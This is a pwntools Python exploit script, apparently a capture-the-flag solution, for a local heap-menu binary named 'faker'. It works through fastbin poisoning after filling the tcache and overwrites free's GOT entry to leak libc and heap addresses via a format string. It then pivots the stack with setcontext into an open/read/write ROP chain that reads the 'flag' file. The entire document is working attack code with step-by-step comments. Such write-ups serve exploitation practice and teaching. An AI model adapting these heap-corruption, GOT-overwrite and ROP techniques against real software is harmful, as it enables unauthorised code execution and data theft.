from pwn import *

p = process("./faker", env={"LD_PRELOAD": "./libc.so.6"})
elf = ELF("faker")
libc = ELF("libc.so.6")

def new(size):
    p.sendlineafter("> ", "1")
    p.sendlineafter(":\n", str(size))
    return int(p.recvregex("at index (\d+)")[0])
def edit(index, data):
    p.sendlineafter("> ", "2")
    p.sendlineafter(":\n", str(index))
    p.sendafter(":\n", data)
def delete(index):
    p.sendlineafter("> ", "3")
    p.sendlineafter(":\n", str(index))

p.sendlineafter('size:\n','5')
p.sendafter('name:\n','flag\x00')

'''
Chunk 0 - 6, count = 7: size 0x70
tcache is full
'''
for i in range(7):
	new(0x68)
	delete(0)

new(0x68) # chunk 0
new(0x68) # chunk 1

delete(0) # fastbin -> 0x71 -> 0
delete(1) # fastbin -> 0x71 -> 0

edit(1, p64(0x6020bd)) # chunk[1]->fd = 0x6020bd
new(0x68) # chunk 0
new(0x68) # chunk 1

payload  = b'AAA'
payload += p64(0) * 2
payload += p32(0x68) * 8 # size -> int
payload += p32(1) * 3 + p32(0) * 5
payload += p64(elf.got['free']) # ptr[0]
payload += p64(0x6020e0) # ptr[1] = &page_size
'''
ptr[0] = fee@got
ptr[1] = &page_size
'''
edit(1, payload) # edit the page_table


edit(0, p64(elf.plt['printf'])) # ptr[0] -> free@got -> printf@plt
new(0x68) # chunk 2
edit(3, "%19$p\n") # FSB

delete(3) # free(chunk[3]) -> %19$p -> printf("%19$p")

libc.address = int(p.recvline().strip(), 16) - libc.symbols['__libc_start_main'] - 231
log.info(f"LIBC:   {hex(libc.address)}")

payload  = p32(0x68) * 8 # size > int
payload += p32(1) * 3 + p32(0) * 5 # flags -> int
payload += p64(elf.got["free"]) # ptr[0] = free@got
payload += p64(0x6020e0)        # ptr[1] = page_size
payload += p64(0x602138)        # *ptr
edit(1, payload)

new(0x70) # 3
new(0x70) # 4

delete(2) # free(chunk2) -> printf(&chunk2)

heap_base = u64(p.recv(4).ljust(8, b"\x00")) - 0x14b0
log.info(f"HEAP:  {hex(heap_base)}")
syscall = libc.address + 0x00000000000d2975
pop_rsi = libc.address + 0x0000000000023e6a
pop_rax = libc.address + 0x00000000000439c8
pop_rdx = libc.address + 0x0000000000001b96
pop_rdi = libc.address + 0x000000000002155f


edit(0, p64(libc.symbols["setcontext"] + 0x35))

'''
Perform stack pivot and oRW

0x7f12c88450a5 <setcontext+53>:  mov    rsp,QWORD PTR [rdi+0xa0]
0x7f12c88450ac <setcontext+60>:  mov    rbx,QWORD PTR [rdi+0x80]
0x7f12c88450b3 <setcontext+67>:  mov    rbp,QWORD PTR [rdi+0x78]
0x7f12c88450b7 <setcontext+71>:  mov    r12,QWORD PTR [rdi+0x48]
0x7f12c88450bb <setcontext+75>:  mov    r13,QWORD PTR [rdi+0x50]
0x7f12c88450bf <setcontext+79>:  mov    r14,QWORD PTR [rdi+0x58]
0x7f12c88450c3 <setcontext+83>:  mov    r15,QWORD PTR [rdi+0x60]
0x7f12c88450c7 <setcontext+87>:  mov    rcx,QWORD PTR [rdi+0xa8]
0x7f12c88450ce <setcontext+94>:  push   rcx
0x7f12c88450cf <setcontext+95>:  mov    rsi,QWORD PTR [rdi+0x70]
0x7f12c88450d3 <setcontext+99>:  mov    rdx,QWORD PTR [rdi+0x88]
0x7f12c88450da <setcontext+106>: mov    rcx,QWORD PTR [rdi+0x98]
0x7f12c88450e1 <setcontext+113>: mov    r8,QWORD PTR [rdi+0x28]
0x7f12c88450e5 <setcontext+117>: mov    r9,QWORD PTR [rdi+0x30]
0x7f12c88450e9 <setcontext+121>: mov    rdi,QWORD PTR [rdi+0x68]
0x7f12c88450ed <setcontext+125>: xor    eax,eax
0x7f12c88450ef <setcontext+127>: ret 
'''
payload = b''
payload += b'flag\x00\x00\x00\x00' + p64(0xffffffffffffff9c) # rdi + 0x60 --> r15, rdi
payload += p64(heap_base + 0x14b0) + p64(0) # rdi + 0x70 --> rsi, rbp
payload += p64(0) + p64(0) # rdi + 0x80 --> rbx, rdx
payload += p64(0) + p64(0) # rdi + 0x90 --> XXX, rcx
payload += p64(heap_base + 0x17d0 - 8) + p64(pop_rax) # rdi + 0xa0 --> rsp,

# Store the payload, one after another
edit(3, payload)
payload  = p32(0xfff) * 8
payload += p32(1) * 5 + p32(0) * 3
payload += p64(elf.got["free"])
payload += p64(0x6020e0)
payload += p64(heap_base + 0x14b0 - 0x60) # otr[2]


edit(1, payload)
# openat(0, "flag", 0)
payload = p64(pop_rax)
payload += p64(257)
payload += p64(syscall)

payload += p64(pop_rax)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(heap_base)
payload += p64(pop_rdx)
payload += p64(0x40)
payload += p64(syscall)


payload += p64(pop_rax)
payload += p64(1)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(heap_base)
payload += p64(pop_rdx)
payload += p64(0x40)
payload += p64(syscall)

edit(4, payload)

delete(2) # Stack Pivot
p.interactive()
